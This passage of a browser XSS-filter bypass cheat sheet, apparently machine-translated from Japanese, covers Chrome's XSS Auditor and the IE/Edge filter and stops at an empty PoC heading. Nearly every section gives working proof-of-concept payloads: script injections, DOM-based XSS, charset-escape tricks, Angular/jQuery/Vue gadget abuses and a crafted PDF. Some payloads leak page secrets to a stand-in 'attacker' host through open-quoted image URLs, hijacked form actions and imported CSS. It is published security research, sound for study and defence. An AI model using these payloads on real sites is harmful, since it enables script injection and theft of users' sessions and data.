    - [Using  (IE only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#pxmlの利用ieのみ)
    - Use of referrer
      - [Use of link functions within the same domain (including subdomains)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#同じドメインサブドメインも含む内にあるリンク機能の利用)
      - [Bypass where arbitrary URL can be specified](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#任意のurlを指定できる箇所でのバイパス)
      - [If the state before submission to the vulnerable form can be maintained on the page](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#脆弱なformへの送信前の状態をページ上に維持できる場合)
      - [Using option tags](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#optionタグの利用)
      - [Using an empty iframe](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#空のiframeの利用)
    - [Using formaction (getting information only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#formactionの利用情報の取得のみ)
    - [Use of character-referenced strings in style (style description only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#styleでの文字参照化した文字列の利用styleの記述のみ)
  - [past bypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#過去のバイパス-1)

# XSS Auditor

## Items not subject to blocking

In contexts where protection is not provided in the first place, scripts can be executed without special manipulation.

### XSS happening in string literals

[https://vulnerabledoma.in/bypass/str_literal?q=%22%3Balert(1)//](https://vulnerabledoma.in/bypass/str_literal?q="%3Balert(1)//)

```
<script>var q="";alert(1)//"</script>
```

### XSS established by URL alone (such as when the input value is directly entered in the href part of the a tag)

https://vulnerabledoma.in/bypass/link?q=javascript:alert(1)

```
<a href="javascript:alert(1)">Link</a>
```

### If you have 2 or more injection points

(It seems to be able to block a considerable number of cases that occur with two or more, but since the case reported in the past ( [#96616 ](https://bugs.chromium.org/p/chromium/issues/detail?id=96616)[#403636](https://bugs.chromium.org/p/chromium/issues/detail?id=403636) ) was WontFixed, it is classified as the one that is not targeted for blocking.)

[https://vulnerabledoma.in/bypass/text?type=2&q=%60-alert(1)%3C/script%3E%3Cscript%3E%60](https://vulnerabledoma.in/bypass/text?type=2&q=`-alert(1)`)

```
<div>`-alert(1)</script><script>`</div>
<div>`-alert(1)</script><script>`</div>
```

### If you have string operations

When some strings are removed or replaced, intervening strings do not block.

#### When deleted

[https://vulnerabledoma.in/bypass/text?type=6&q=%3Csvg%20o%3Cscript%3Enload=alert(1)%3E](https://vulnerabledoma.in/bypass/text?type=6&q=nload=alert(1)>)

```
<svg o<script>nload=alert(1)>
↓
<svg onload=alert(1)>
```

#### When replaced

[https://vulnerabledoma.in/bypass/text?type=7&q=%3Cscript%3E/%26/-alert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/text?type=7&q=/%26/-alert(1))

```
<script>/&/-alert(1)</script>
↓
<script>/&amp;/-alert(1)</script>
```

### `document.write()`DOM based XSS other than request string

[https://vulnerabledoma.in/bypass/dom_innerhtml#%3Cimg%20src=x%20onerror=alert(1)%3E](https://vulnerabledoma.in/bypass/dom_innerhtml#)

```
<body>
<script>
hash=location.hash.slice(1);
document.body.innerHTML=decodeURIComponent(hash);
</script>
</body>
```

https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(1)

```
<script>
location.href=decodeURIComponent(location.hash.slice(1));
</script>
```

### XSS in XML pages

[https://vulnerabledoma.in/bypass/xml?q=%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/xml?q=alert(1))

```
<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>
```

Bypass also occurs when a string can be written from the top of the page, `Content-Type`is not specified correctly, and XML is selected by Content Sniffing.

[https://vulnerabledoma.in/bypass/text?mime=unknown&q=%3C?xml%20version=%221.0%22?%3E%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/text?mime=unknown&q=alert(1))

```
<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
```

Anything less than this does not lead to script execution, but is allowed to be written and has the potential to be used for attacks to some extent.

### http(s): create link

[https://vulnerabledoma.in/bypass/text?q=%3Ca%20href=https://attacker/%3ESession%20expired.%20Please%20login%20again.%3C/a%3E](https://vulnerabledoma.in/bypass/text?q=Session expired. Please login again.)

```
<a href=https://attacker/>Session expired. Please login again.</a>
```

### Tags that can send requests to the outside

It is sometimes possible to include confidential information in requests such as images, for example by using open quotes.

[https://vulnerabledoma.in/bypass/text?type=8&q=%3Cimg%20src=%22https://attacker/?data=](https://vulnerabledoma.in/bypass/text?type=8&q=

```
<p><img src="https://attacker/?data=</p>
<p>This is a secret text.</p>
<p id="x">AAA</p>
```

### Arbitrary CSS description

In addition to disguising the appearance of the page, if the same page contains sensitive information, it may be possible to retrieve the information using only CSS. See URL for details.

Reference URL:

- http://www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt
- https://masatokinugawa.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html

[https://vulnerabledoma.in/bypass/text?q=%3Cstyle%3E@import%20%27//attacker/test.css%27%3C/style%3E](https://vulnerabledoma.in/bypass/text?q=@import '//attacker/test.css')

```
<style>@import '//attacker/test.css'</style>
```

[https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=stylesheet%20href=//attacker/test.css%3E](https://vulnerabledoma.in/bypass/text?q=)

```
<link rel=stylesheet href=//attacker/test.css>
```

## bypass

### Using the SVG animation values attribute (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=709365
- https://bugs.chromium.org/p/chromium/issues/detail?id=738017

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%20xmlns:xlink=http://www.w3.org/1999/xlink%3E%3Canimate%20xlink:href=%23x%20attributeName=%22xlink:href%22%20values=%22%26%23x3000%3Bjavascript:alert(1)%22%20/%3E%3Ca%20id=x%3E%3Crect%20width=100%20height=100%20/%3E%3C/a%3E](https://vulnerabledoma.in/bypass/text?q=)

```
<svg xmlns:xlink=http://www.w3.org/1999/xlink><animate xlink:href=#x attributeName="xlink:href" values="&#x3000;javascript:alert(1)" /><a id=x><rect width=100 height=100 /></a>
```

### Using multiple null characters (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. a null byte is printed
3. no preceding whitespace

Reference URL:

- https://twitter.com/0rbz_/status/896896095862669312

PoC:

[https://vulnerabledoma.in/bypass/text?q=%00%00%00%00%00%00%00%3Cscript%3Ealert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=alert(1))

```
[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
```

### `-->`Using comments within script tags (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is a closing tag of the script tag without a line break after it

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=753307

PoC:

[https://vulnerabledoma.in/bypass/text?type=9&q=%3Cscript%3Ealert(1)%0A--%3E](https://vulnerabledoma.in/bypass/text?type=9&q=alert(1) -->)

```
<div><script>alert(1)
--></div><script src=/test.js></script>
```

### Using half-baked base tags (Safari only)

#### Use of Flash

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. immediately followed by whitespace or `'"`after
3. Flash can be used in the target environment

Reference URL:

- https://masatokinugawa.l0.cm/2016/05/xss8.html

PoC:

(if there is no space immediately after) [https://vulnerabledoma.in/bypass/text?type=3&q=%3Cembed%20allowscriptaccess=always%20src=/xss.swf%3E%3Cbase%20href=//l0.cm /](https://vulnerabledoma.in/bypass/text?type=3&q=

```
<div><embed allowscriptaccess=always src=/xss.swf><base href=//l0.cm/</div>
```

(If there is a white space immediately after) [https://vulnerabledoma.in/bypass/text?type=4&q=%3Cembed%20allowscriptaccess=always%20src=/xss.swf%3E%3Cbase%20href=%22//l0 .cm/](https://vulnerabledoma.in/bypass/text?type=4&q=

```
<div> <embed allowscriptaccess=always src=/xss.swf><base href="//l0.cm/ </div><div id="x"></div>
```

#### Using scripts loaded with relative URLs

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. immediately followed by whitespace or `'"`after
3. After that there is a part that loads the script with a relative URL

PoC:

[https://vulnerabledoma.in/bypass/text?type=9&q=%3Cbase%20href=//cors.l0.cm/](https://vulnerabledoma.in/bypass/text?type=9&q=

```
<div><base href=//cors.l0.cm/</div><script src=/test.js></script>
```

### Use of ISO-2022-JP escape sequences

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is no character code specified on the page

supplement:

In ISO-2022-JP HTML, `[0x1B](B`byte sequences such as , `[0x1B](H`, `[0x1B](J`are ignored. You can bypass this by putting it between react strings. Also, in Chrome/Safari, `[0x1B]$@[0x0A]`byte strings such as are `[0x0A]`treated in the same way as, but the XSS Auditor cannot interpret them well and causes a bypass.

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=114941
- https://l0.cm/encodings/test3/

PoC:

- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Bnload=alert(1)%3E](https://vulnerabledoma.in/bypass/text?q=)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Hnload=alert(1)%3E](https://vulnerabledoma.in/bypass/text?q=)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Jnload=alert(1)%3E](https://vulnerabledoma.in/bypass/text?q=)

```
<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
```

(*Because the $ symbol is arbitrarily encoded and does not work as intended, the redirect is sandwiched by a method that includes a $.)

- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$@%0A%3C/script%3E](https://tinyurl.com/l9mxds2)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$B%0A%3C/script%3E](https://tinyurl.com/ml23lh9)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B(I%0A%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=alert(1)(I )
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$@%0D%3C/script%3E](https://tinyurl.com/lfks6v6)

```
<meta charset=iso-2022-jp><script>alert(1)[0x1B]$@[0x0A]</script>
```

### Use of resources in the same domain

XSS Auditor does not block loading same-domain resources that do not have queries. Bypassing is possible in some cases if the resources necessary for an attack can be placed in the same domain.

#### Case with XSS in path (Chrome only)

Conditions for attacking:

1. XSS that can write arbitrary tags is in the path
2. Doesn't require a query to display the page

PoC:

[https://vulnerabledoma.in/bypass/path/%3Clink%20rel=import%20href=%22%2Fbypass%2Fpath%2F%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E](https://vulnerabledoma.in/bypass/path/)

```
PATH_INFO:/<link rel=import href="/bypass/path/<script>alert(1)</script>">
```

#### File upload function

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Hosting user-uploaded files on the same origin

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3Cscript%20src=/bypass/usercontent/xss.js%3E%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=)

```
<script src=/bypass/usercontent/xss.js></script>
```

(Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/usercontent/icon.jpg%3E](https://vulnerabledoma.in/bypass/text?q=)

```
<link rel=import href=/bypass/usercontent/icon.jpg>
```

#### `flashvars`Use with Flash

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. `ExnternalInterface.call()`There is Flash passing the parameter string unescaped to the same origin
3. Flash can be used in the target environment

supplement:

`flashvars`Attributes let you pass parameters without having to provide Flash parameters directly in the query. (= On the Flash side, even if passing parameters from the URL is restricted as a countermeasure against XSS by opening Flash directly, `flashvars`it can be passed.) In addition, `Content-Security-Policy: default-src 'self'`when there is a CSP such as also available.

PoC:

[https://vulnerabledoma.in/bypass/text?csp=self&q=%3Cembed%20name=a%20flashvars=%27autoplay=true%26file=%22})\%22)-(alert=alert(1)))}catch(e){}//%27%20allowscriptaccess=always%20src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf%3E](https://vulnerabledoma.in/bypass/text?csp=self&q=)

```
<embed name=a flashvars='autoplay=true&file="})\")-(alert=alert(1)))}catch(e){}//' allowscriptaccess=always src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf>
```

ActionScript:

```
ExternalInterface.call("setTimeout", ExternalInterface.objectID + '_event' + "('" + eventName + "'," + eventValues + ")", 0);
```

#### Use with `ExternalInterface.objectID`Flash`ExternalInterface.call()`

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is Flash being passed to the `ExternalInterface.objectID`same origin`ExternalInterface.call()`
3. Flash can be used in the target environment

supplement:

`ExternalInterface.objectID`is a property in which the value of the name attribute of the tag used for embedding is set, and although it cannot be XSSed by itself, it can be used only for bypassing. It `Content-Security-Policy: default-src 'self'`can also be used to bypass CSP when there are restrictions on CSP such as.

PoC:

[https://vulnerabledoma.in/bypass/text?csp=self&q=%3Cembed%20name=%27alert(1)-%27%20allowscriptaccess=always%20src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf%3E](https://vulnerabledoma.in/bypass/text?csp=self&q=)

```
<embed name='alert(1)-' allowscriptaccess=always src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf>
```

ActionScript:

```
ExternalInterface.call(ExternalInterface.objectID + '_init');
```

#### Using Angular

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. A page on the same origin that hosts Angular or loads Angular from a CORS-enabled CDN

supplement:

Angular will try to expand the template enclosed in {{}} inside the tag with the attribute ng-app. Templates can run scripts.

Reference URL:

- https://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3Cscript%20src=%22/js/angular1.6.4.min.js%22%3E%3C/script%3E%3Cp%20ng-app%3E{{constructor.constructor(%27alert(1)%27)()}}](https://vulnerabledoma.in/bypass/text?q={{constructor.constructor('alert(1)')()}})

```
<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}
```

If you have a page on the same origin that loads Angular from a CORS-enabled CDN, you can load resources from external origins by indirectly loading them from HTML Imports.

(Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=angular.html%3E%3Cp%20ng-app%3E{{constructor.constructor(%27alert(1 ) )%27)()}}](https://vulnerabledoma.in/bypass/text?q={{constructor.constructor('alert(1)')()}})

```
<link rel=import href=angular.html><p ng-app>{{constructor.constructor('alert(1)')()}}
```

#### Using Vue.js

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. A page on the same origin that hosts Vue.js or loads from a CORS-enabled CDN
3. There is a script on the page or on the same origin that can perform template expansion for specially crafted tags

PoC:

(This example is for Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/vue.html%3E%3Cdiv%20id=app%3E{{constructor. constructor(%27alert(1)%27)()}}](https://vulnerabledoma.in/bypass/text?q={{constructor.constructor('alert(1)')()}})

```
<link rel=import href=/bypass/vue.html><div id=app>{{constructor.constructor('alert(1)')()}}
```

#### Using jQuery

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. A page on the same origin that hosts jQuery or loads jQuery from a CORS-enabled CDN
3. There is a script on the page or on the same origin that can execute jQuery additional functions for the crafted form tag

supplement:

Additional jQuery functions are , `after`, `before`, `prepend`, `append`, `html`, `replaceWith`, `wrap`, `wrapAll`, `insertBefore`, `insertAfter`, `prependTo`and `appendTo`so on. `ownerDocument`By using a form component with a name attribute, the reference destination of [Node.ownerDocument](https://developer.mozilla.org/ja/docs/Web/API/Node/ownerDocument) is misunderstood, and the script is executed when it should not be executed (this technique is known as [DOM Clobbering ). ](https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream/21)`<!--`In addition, the fact that there is a process to [remove](https://github.com/jquery/jquery/blob/a6b0705294d336ae2f63f7276de0da1195495363/src/manipulation.js#L206) script blocks before execution, combined with the fact that Auditor does not block script blocks that contain only comments, causes the bypass.

Reference URL:

- https://sirdarckcat.github.io/csp/jquery.html

PoC:

[https://vulnerabledoma.in/bypass/text?type=5&q=%3Cform%20class=child%3E%3Cinput%20name=ownerDocument%3E%3Cscript%3E%3C!--alert(1)%3C/script%3E%3C/form%3E](https://vulnerabledoma.in/bypass/text?type=5&q=<!--alert(1))

```
<!DOCTYPE html>
<html>
<head>
<script src="/js/jquery-3.2.1.min.js"></script>
<script>
$(document).ready(function(){
    // code taken from http://api.jquery.com/after/
    $( ".container" ).after( $( ".child" ) );
});
</script>
</head>
<body>
<!-- XSS -->
<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
<!-- XSS -->
<p class="container"></p>
</body>
<!-- Inspired by @sirdarckcat CSP bypass trick: https://sirdarckcat.github.io/csp/jquery.html -->
</html>
```

(This example is Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/jquery.html%3E%3Cp%20class=container%3E%3C/p %3E%3Cform%20class=child%3E%3Cinput%20name=ownerDocument%3E%3Cscript%3E%3C!--alert(1)%3C/script%3E%3C/form%3E](https://vulnerabledoma.in/bypass/text?q=<!--alert(1))

```
<link rel=import href=/bypass/jquery.html><p class=container></p><form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
```

#### Using underscore.js

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Pages on the same origin that host underscore.js or load from a CORS-enabled CDN
3. A script exists on the page or on the same origin that can execute template expansion for a specially crafted script tag

PoC:

(This example is for Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/underscore.html%3E%3Cscript%20id=template%3E//%3C %alert`1`%%3E%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/underscore.html%3E%3Cscript%20id=template%3E//%3C%alert%601%60%%3E%3C/script%3E)

```
<link rel=import href=/bypass/underscore.html><script id=template>//<%alert`1`%></script>
```

#### Using JSX transformation scripts such as JSXTransformer/babel-standalone

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Pages on the same origin that host JSX transformation scripts such as JSXTransformer.js or load them from a CORS-enabled CDN

supplement:

Take advantage of the conversion script parsing SVG script blocks in the same way as HTML script blocks. The comment part enclosed by is evaluated as a script because `<!--`it is not actually executed .`-->`

PoC:

(This example is for Chrome only) [https://vulnerabledoma.in/bypass/text?charset=utf-8&type=1&q=%3Clink%20rel=import%20href=/bypass/babel-standalone.html%3E%3Csvg%3E %3Cscript%20type=%22text/jsx%22%3E//%3C!--%0aalert(1)//--%3E%3C/svg%3E%3Cscript%3E0%3C/script%3E](https://vulnerabledoma.in/bypass/text?charset=utf-8&type=1&q=//0)

```
<link rel=import href=/bypass/babel-standalone.html><svg><script type=text/jsx>//<!--
alert(1)//--></svg><script>0</script>
```

### `document.write()`Occasionally use half-baked tags (Chrome only)

Conditions for attacking:

1. `document.write()`There is an XSS that renders the URL
2. The tag used for the attack `document.write()`can be closed outside (in the case of the PoC below, `</body>`is used as the closing tag)

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=421786

PoC:

[https://vulnerabledoma.in/bypass/dom_docwrite#%3Cimg%20src=x%20onerror=alert(1)//](https://vulnerabledoma.in/bypass/dom_docwrite#

```
<body>
<script>
hash=location.hash.slice(1);
document.write(decodeURIComponent(hash));
</script>
</body>
```

### Using half-baked form tags (getting information only) (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. New form tags can be placed where existing form content containing sensitive information can be submitted

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=719092

PoC:

(if you are inside a form) [https://vulnerabledoma.in/bypass/form?q=%22%3E%3C/form%3E%3Cform%20action=https://attacker/](https://vulnerabledoma.in/bypass/form?q=">

```
<form action="form">
<input type="hidden" name="q" value=""></form><form action=https://attacker/">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

(when outside the form) [https://vulnerabledoma.in/bypass/form2?q=%3Cbutton%20form=f%3ECLICK%3Cform%20id=f%20action=https://attacker/](https://vulnerabledoma.in/bypass/form2?q=CLICK

```
<div><button form=f>CLICK<form id=f action=https://attacker/</div>
<form action="form2">
<input type="hidden" name="secret" value="a09d3ef0">
</form>
```

## past bypass

Posted [in Fixed Bypass Archive .](https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive#xss-auditor)

# XSS filter for IE/Edge

## Items not subject to blocking

### XSS happening in string literals

supplement:

Previously there was a blocking condition for string literals. Although it still partially remains, assignments to obviously attackable, which were previously blocked, `location`are allowed, and there is almost no protection. It doesn't look like it's going to provide protection anymore, so I've categorized it as non-blocking rather than bypass.

[https://vulnerabledoma.in/bypass/str_literal?q=%22%3Blocation='javascript\x3Aalert\x281\x29'//](https://vulnerabledoma.in/bypass/str_literal?q="%3Blocation='javascript\x3Aalert\x281\x29'//)

```
<script>var q="";location='javascript\x3Aalert\x281\x29'//"</script>
```

### All DOM based XSS

[https://vulnerabledoma.in/bypass/dom_docwrite#%3Cimg%20src=x%20onerror=alert(1)%3E](https://vulnerabledoma.in/bypass/dom_docwrite#)

```
<script>
hash=location.hash.slice(1);
document.write(decodeURIComponent(hash));
</script>
```

[https://vulnerabledoma.in/bypass/dom_innerhtml#%3Cimg%20src=x%20onerror=alert(1)%3E](https://vulnerabledoma.in/bypass/dom_innerhtml#)

```
<body>
<script>
hash=location.hash.slice(1);
document.body.innerHTML=decodeURIComponent(hash);
</script>
</body>
```

https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(1)

```
<script>
location.href=decodeURIComponent(location.hash.slice(1));
</script>
```

### XSS with 2 or more injection points on one page

[https://vulnerabledoma.in/bypass/text?type=2&q=%22src=data:,alert%25281%2529%3E%3C/script%3E%3Cscript%20x=%22](https://vulnerabledoma.in/bypass/text?type=2&q="src=data:,alert%281%29>

```
<div>"src=data:,alert%281%29></script><script x="</div>
<div>"src=data:,alert%281%29></script><script x="</div>
```

### If you have string operations

When some strings are removed or replaced, intervening strings do not block.

#### When deleted

[https://vulnerabledoma.in/bypass/text?type=6&q=%3Csvg%20o%3Cscript%3Enload=alert(1)%3E](https://vulnerabledoma.in/bypass/text?type=6&q=nload=alert(1)>)

```
<svg o<script>nload=alert(1)>
↓
<svg onload=alert(1)>
```

#### When replaced

`.`It will not be possible to block if the position expressed by the regular expression of the filter is replaced by more than the [determined width .](https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9?slide=50)

We take advantage of the over-replacement behavior to `<sc{r}ipt.*?>`avoid matching the blocking condition if: is a wildcard of 0-3 characters, and is a wildcard of 0-5 characters, so the maximum width that can be cut off is 8 characters. The string length of the output after substitution is 10 characters, which exceeds the width of 8 characters and cannot be cut off.`&``/``&``/&amp;`

PoC:

[https://vulnerabledoma.in/bypass/text?type=10&q=%3Cscript/%26%3Ealert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/text?type=10&q=alert(1))

```
<script/&>alert(1)</script>
↓
<script/&amp;amp;>alert(1)</script>
```

Anything less than this does not lead to script execution, but is allowed to be written and has the potential to be used for attacks to some extent.

### Tags that can send requests to the outside

It is sometimes possible to include confidential information in requests such as images, for example by using open quotes.

[https://vulnerabledoma.in/bypass/text?type=8&q=%3Cimg%20src=%22https://attacker/?data=](https://vulnerabledoma.in/bypass/text?type=8&q=

```
<p><img src="https://attacker/?data=</p>
<p>This is a secret text.</p>
<p id="x">AAA</p>
```

## bypass

### Using strings disguised as XML namespaces (Edge only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Flash is enabled in the target environment
3. `X-XSS-Protection:1; mode-block`does not have a header

supplement:

Edge will also try to block tags with an XML namespace. `<embed/:script`If such a string is used in normal HTML, it will be interpreted as a script tag instead of being interpreted as an embed tag, and blocking will fail. `X-XSS-Protection:1; mode-block`If the header is attached, the bypass will fail because the cut-off operation will have occurred .

Reference URL:

- https://masatokinugawa.l0.cm/2016/12/xss9.html

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3Cembed/:script%20allowscriptaccess=always%20src=//l0.cm/xss.swf%3E](https://vulnerabledoma.in/bypass/text?q=)

```
<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
```

### Using HZ-GB-2312 Escape Sequences

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. `Content-Type`There is no character code specified in the header

Reference URL:

- https://masatokinugawa.l0.cm/2015/09/xss7.html

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3Cx~%0Aonfocus=alert%281%29%20id=a%20tabindex=0%3E#a](https://vulnerabledoma.in/bypass/text?q=#a)

```
<x~
onfocus=alert(1) id=a tabindex=0>
```

### Using encoding behavior when navigating

Conditions for attacking:

1. Has reflective XSS via GET

supplement:

During navigation, IE/Edge encodes the query string with the character code of the page before navigation and sends the request. At this time, the XSS filter was (presumably) checking the encoded string itself, not the request being sent, which could cause a mismatch between the encoded string and the bytes actually sent. Bypass occurs when

A specific example is shown with the character code x-chinese-cns used in the PoC below. In x-chinese- `旡`cns the character is mapped to 0xA13E. At this time, a query including this character string is sent from a page with x-chinese-cns set as the character code of the page `<script/旡`, attached to a parameter with reflective XSS. Then, the sent request will `旡`not be expressed in UTF-8, but the byte itself encoded in x-chinese- `</script/0xA1>`cns (0x3E `>`), and the `<script>`tag will be written in the page. Normally, if `<script>`you write a tag, the XSS filter should work, but it doesn't work here. It is speculated that the reason for this is that the filter mistakenly `<script/旡`saw the character string and `<sc{r}ipt.*?>`did not match the blocking condition.

Reference URL:

- https://masatokinugawa.l0.cm/2017/05/xss14.html

PoC:

- https://l0.cm/bypass/ie_x-chinese-cns_text.html

```
<meta charset=utf-8>
<script>
  document.charset="x-chinese-cns";
  location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)<\/script/旡"
</script>
```

(For XSS with attribute value only) https://l0.cm/bypass/ie_x-chinese-cns_attribute.html

```
<meta charset=utf-8>
<script>
  document.charset="x-chinese-cns";
  location="https://vulnerabledoma.in/bypass/attribute?q=乜onmouseover=alert(1)//"
</script>
```

As with other character codes, a mismatch between the encoded string and the bytes actually sent can be bypassed.

- https://l0.cm/bypass/ie_hz_text.html
- https://l0.cm/bypass/ie_hz_attribute.html
- https://l0.cm/bypass/ie_iso2022jp_text.html
- https://l0.cm/bypass/ie_iso2022jp_attribute.html

(The following is reproduced in an environment where the system locale is Japanese, but it was not reproduced in an environment with a German language. It seems that the operating principle is slightly different from other vectors, but I do not know the clear principle.For reference published in.)

- https://l0.cm/bypass/ie_0xff_text.html
- https://l0.cm/bypass/ie_0xff_attribute.html

### Using the Adobe Acrobat Reader plug-in (IE only)

Conditions for attacking:

1. Has XSS via POST request
2. Target is using the Adobe Acrobat Reader plugin

Reference URL:

- https://insert-script.blogspot.com/2017/01/complete-internet-explorer-xss-filter.html

PoC:

https://l0.cm/bypass/ie_postxss_bypass.pdf

```
%PDF-1.1
1 0 obj
<<
/Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R
/OpenAction 33 0 R
/AcroForm 22 0 R
>>
endobj
2 0 obj
<<
/Type /Outlines
/Count 0
>>
endobj
3 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
4 0 obj
<<
/Type /Page
/Annot [ 23 0 R ]
/Parent 3 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
/Resources <<
/ProcSet [/PDF /Text]
/Font << /F1 6 0 R >>
>>
>>
endobj
5 0 obj
<< /Length 56 >>
stream
BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET
endstream
endobj
6 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F1
/BaseFont /Helvetica
/Encoding /MacRomanEncoding
>>
endobj

33 0 obj
<<
/S /SubmitForm
/F
        <<
        % URL TO SUBMIT TO:
        /F (https://vulnerabledoma.in/bypass/text)
        /FS /URL
        >>
% SPECIFIES THE FORMAT AND OTHER FORM RELATED CONFIGURATION
/Flags 6
>>
endobj

22 0 obj
<<
    /Fields [23 0 R]
>>
endobj
23 0 obj
<<
    /DA (/Helv 12 Tf 0 g)
    /F 4
    /FT /Tx
    /Rect [ 9.526760 680.078003 297.527008 702.078003 ]
    /Subtype /Widget
    /Type /Annot
    % PARAMETER NAME
    /T (q)
    % PARAMETER PAYLOAD
    /V (<script>alert\(1\)</script>)
    /P 4 0 R
>>
endobj
trailer
<<
/Root 1 0 R
>>
```

### Using Content Sniffing for XML (IE Only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. `X-Content-Type-Options:nosniff`is not attached
3. Character strings can be written from the top of the page

Reference URL:

- https://twitter.com/0x6D6172696F/status/753647521050849280

PoC:

